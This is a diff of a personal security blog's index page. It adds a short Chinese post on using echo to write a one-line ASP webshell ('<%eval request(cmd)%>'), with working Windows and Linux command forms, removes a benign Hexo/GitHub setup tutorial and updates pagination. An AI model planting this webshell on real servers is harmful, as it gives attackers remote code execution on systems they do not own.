@@ -236,6 +236,139 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/18/echo写马技巧/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/09/18/echo写马技巧/" itemprop="url">echo写马技巧</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-18T08:15:41+08:00">
+                2018-09-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p>win下与Linux写马方式不同 记录一下</p>
+</blockquote>
+<hr>
+<p><strong>1.windows环境：</strong></p>
+<p>错误姿势:</p>
+<pre><code>echo &quot;&lt;%eval request(cmd)%&gt;&quot; &gt; c:\test\test.asp
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/3c1ubw1t3pztnb0ti98k4ppi/image_1cnlvn0if65u1ej713rtjrc1jv19.png" alt="image_1cnlvn0if65u1ej713rtjrc1jv19.png-6.8kB"></p>
+<p>我们可以看到我们的代码加了引号 导致无法执行</p>
+<p>正确姿势:</p>
+<pre><code>echo ^&lt;%eval request(cmd)%^&gt; &gt; c:\test\cmd.asp
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/nd2sueikbr59v1ri2sdev74q/image_1cnlvt3ufjbonoe1gaj91u1eujm.png" alt="image_1cnlvt3ufjbonoe1gaj91u1eujm.png-9.8kB"></p>
+<p><strong>2.Linux环境：</strong><br>linux下正确写马:<code>echo &quot;&lt;%eval request(cmd)%&gt;&quot; &gt; test.asp</code><br><img src="http://static.zybuluo.com/chhyx/fx68wthg11dls5bmxemtinjy/image_1cnm0h7smciu1gel1muegi4150u1j.png" alt="image_1cnm0h7smciu1gel1muegi4150u1j.png-61.1kB"></p>
+<p><strong>参考链接:</strong><br><a href="https://mochazz.github.io/2017/08/26/echo/" target="_blank" rel="noopener">https://mochazz.github.io/2017/08/26/echo/</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/17/ThinkPHP3.x5.x框架任意文件包含/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -453,7 +586,7 @@ public function fetch($template, $vars = [], $config = [])
             echo $content;
         }
     }
-</code></pre><p>在上面的<code>$this-&gt;storage-&gt;read($cacheFile, $this-&gt;data);</code>我们打印下看看:<br>![image.png-75.5kB][9]<br>D.跟进<code>thinkphp\library\think\template\driver\File.php</code></p>
+</code></pre><p>在上面的<code>$this-&gt;storage-&gt;read($cacheFile, $this-&gt;data);</code>我们打印下看看:<br><img src="http://static.zybuluo.com/chhyx/j7ho82m627t9qpqfrmcxcbao/image.png" alt="image.png-75.5kB"><br>D.跟进<code>thinkphp\library\think\template\driver\File.php</code></p>
 <pre><code>#thinkphp5_0_10\thinkphp\library\think\template\driver\File.php 43行
 public function read($cacheFile, $vars = [])
     {   
@@ -2038,172 +2171,13 @@ alert(1);  执行的js代码
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/05/用hexo+girhub部署博客/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="P0rZ9">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="P0rZ9's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/09/05/用hexo+girhub部署博客/" itemprop="url">用hexo+github部署博客</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-05T10:15:41+08:00">
-                2018-09-05
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <blockquote>
-</blockquote>
-<hr>
-<p> 不多说，先上图:<br><img src="http://static.zybuluo.com/chhyx/a0dhagjvyliwehbr6ems59ab/image_1cmkl94jtni51q3n1jbuhk6agt51.png" alt="image_1cmkl94jtni51q3n1jbuhk6agt51.png-1345.8kB"></p>
-<p> <strong>一. 准备部分：</strong><br>   1.下载安装<a href="https://nodejs.org/en/" target="_blank" rel="noopener">node.js</a><br><img src="http://static.zybuluo.com/chhyx/315m63hcb115ks6k69ibg56k/image_1cmklc598a3c1upgo1c18021bdu6e.png" alt="image_1cmklc598a3c1upgo1c18021bdu6e.png-20.5kB"><br>直接默认下一步安装即可,待安装完成后,在cmd运行：</p>
-<p>   node -v</p>
-<p>若显示版本信息 则表明成功安装<br><img src="http://static.zybuluo.com/chhyx/veiud9feuetbol2fec8o14yh/image_1cmklf8dmcdfecn5kdjje1jbn6r.png" alt="image_1cmklf8dmcdfecn5kdjje1jbn6r.png-7.1kB"></p>
-<p>   2.下载安装<a href="https://git-scm.com/download" target="_blank" rel="noopener">Git</a><br>   <img src="http://static.zybuluo.com/chhyx/nkidyyw6phdtmyfxx6s2kvin/image_1cmkloj4jb0m76j86b1897e1l78.png" alt="image_1cmkloj4jb0m76j86b1897e1l78.png-28.2kB"><br>   直接默认安装即可,待安装完成后,在cmd运行：</p>
-<pre><code>git --version
-</code></pre><p>若显示版本信息 则表明成功安装<br>   <img src="http://static.zybuluo.com/chhyx/eofysd32sln0qvj99dvtzodp/image_1cmklr6mv6j593qlgt1u3u16227l.png" alt="image_1cmklr6mv6j593qlgt1u3u16227l.png-8.9kB"></p>
-<p> <strong>二. Git部分</strong></p>
-<p>1.首先注册一个github账号:<br><img src="http://static.zybuluo.com/chhyx/yxjc7ye3qpswxl4vslcktnmw/image_1cmkpnalum071qnj1h8e1ol1vpsga.png" alt="image_1cmkjubqc9aq1kb011vkn3i2j32g.png-91kB"></p>
-<p>然后用新注册的邮箱登陆<br>2.点击NEW repository:<br><img src="http://static.zybuluo.com/chhyx/hqnms4ri266j82lbkebz6p1n/image_1cmkkj8qvqge1ehi48n1l8rflq3a.png" alt="image_1cmkkj8qvqge1ehi48n1l8rflq3a.png-39.3kB"></p>
-<p>3.填写repository name:<br><img src="http://static.zybuluo.com/chhyx/8pnjy0pgo1sjsekom35h5z52/image_1cmkkgpudh85rlvabt81espd2t.png" alt="image_1cmkkgpudh85rlvabt81espd2t.png-67.9kB"></p>
-<p>4.然后在新建的P0rZ9.github.io里,找到setting<br><img src="http://static.zybuluo.com/chhyx/camlvc1fxk5hwh6piz8l0l5v/image_1cmkkqohi929195m151e1cs21lkv3n.png" alt="image_1cmkkqohi929195m151e1cs21lkv3n.png-47.6kB"></p>
-<p>5.在下面的page里选择一个样式:<br><img src="http://static.zybuluo.com/chhyx/2ultb5xv1m8ig5r09dz3osk3/image_1cmkktvug1711h2l2v8183s9ns4k.png" alt="image_1cmkktvug1711h2l2v8183s9ns4k.png-37.2kB"><br><img src="http://static.zybuluo.com/chhyx/4qnpecna39l5et99fdusqkoq/image_1cmkq1up5kj86op14b9vo01eg1gn.png" alt="image_1cmkq1up5kj86op14b9vo01eg1gn.png-110.5kB"><br>然后保存即可<br>6.浏览器访问<a href="https://P0rZ9.github.io" target="_blank" rel="noopener">https://P0rZ9.github.io</a>, 可以正常访问就说明我们的Git部分已经成功完成</p>
-<p> <strong>三.Hexo部分</strong><br>1.安装hexo：<br>创建一个用于存放hexo组件的目录，我这里创建一个blogs目录为例，进入创建好的blogs目录，右键选择Git Bash Here<br>在新打开的Git窗口输入命令:</p>
-<pre><code>npm install -g hexo-cli
-</code></pre><p>2.新建一个网站:<br>安装hexo完成后,在文件夹内(blogs)执行命令:</p>
-<pre><code>hexo init
-</code></pre><p>hexo将会在指定的文件夹内新建所需要的文件，文件目录如下:<br><img src="http://static.zybuluo.com/chhyx/89ttxauk6impiqbrt5i0o744/image_1cmkmv4m41ot4apo85hvfiknqbf.png" alt="image_1cmkmv4m41ot4apo85hvfiknqbf.png-30.4kB"></p>
-<p>3.生成静态页面:</p>
-<pre><code>hexo g
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/xe5jwau68h3t2zpbu6ig25vt/image_1cmkn32581q2012kf1oqn17rv1hsadc.png" alt="image_1cmkn32581q2012kf1oqn17rv1hsadc.png-39.7kB"></p>
-<p>4.启动本地服务器:</p>
-<pre><code>hexo s
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/o4b6ncisb1pvzhoh2w0bw2r5/image_1cmkn6ba514cn3beai7eul0dp.png" alt="image_1cmkn6ba514cn3beai7eul0dp.png-9.4kB"></p>
-<p>5.然后浏览器访问:  <em><a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a></em> 即可看到我们的博客首页<br><img src="http://static.zybuluo.com/chhyx/f9j8ade5ne4md4ccl62l1m5l/image_1cmkn93j7ouk1o9c1p2t4im18u8e6.png" alt="image_1cmkn93j7ouk1o9c1p2t4im18u8e6.png-407.2kB"></p>
-<p>当然这只是本地查看博客文章的效果 接下来我们要部署到github page上去</p>
-<p> <strong>四.部署到github</strong><br>1.安装 hexo-deployer-git</p>
-<pre><code>npm install hexo-deployer-git --save
-</code></pre><p>2.修改_config.yml文件：<br> 将</p>
-<pre><code>deploy:
-  type:
-</code></pre><p>修改为(将这里的P0rZ9更换为你自己的username):</p>
-<pre><code>deploy:
-  type: git 
-  repo: https://github.com/P0rZ9/P0rZ9.github.io.git 
-  branch: master
-</code></pre><p>这里需要注意每个冒号后面需要空一格才能填写</p>
-<p>3.部署:<br>运行命令:<br>    hexo g &amp;&amp; hexo d<br>然后根据提示填写github的账号密码<br><img src="http://static.zybuluo.com/chhyx/lumkhwwyb0sugnxlkzat4qdc/image_1cmkp13il1b7rs231fj0skg1jhvft.png" alt="image_1cmkp13il1b7rs231fj0skg1jhvft.png-81.4kB"></p>
-<p><img src="http://static.zybuluo.com/chhyx/x2fn4z632fj7r1apt9khryrk/image_1cmkoj5n61mls165h1158o50q9uej.png" alt="image_1cmkoj5n61mls165h1158o50q9uej.png-25.1kB"></p>
-<p>然后访问<a href="https://p0rz9.github.io/" target="_blank" rel="noopener">https://p0rz9.github.io/</a><br><img src="http://static.zybuluo.com/chhyx/gdf0d96y6v3e6jkegzancb0g/image_1cmkoq4cj1nf01s1c1fivjqj1v09fg.png" alt="image_1cmkoq4cj1nf01s1c1fivjqj1v09fg.png-397.9kB"><br>成功搭建。</p>
-<p> <strong>五. 参考资料</strong><br><a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">Hexo中文指南</a><br><a href="https://www.jianshu.com/p/9df4aba9c25a" target="_blank" rel="noopener">hexo+github搭建blog</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+  </nav>
+
 
 
           </div>
@@ -2247,7 +2221,7 @@ alert(1);  执行的js代码
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
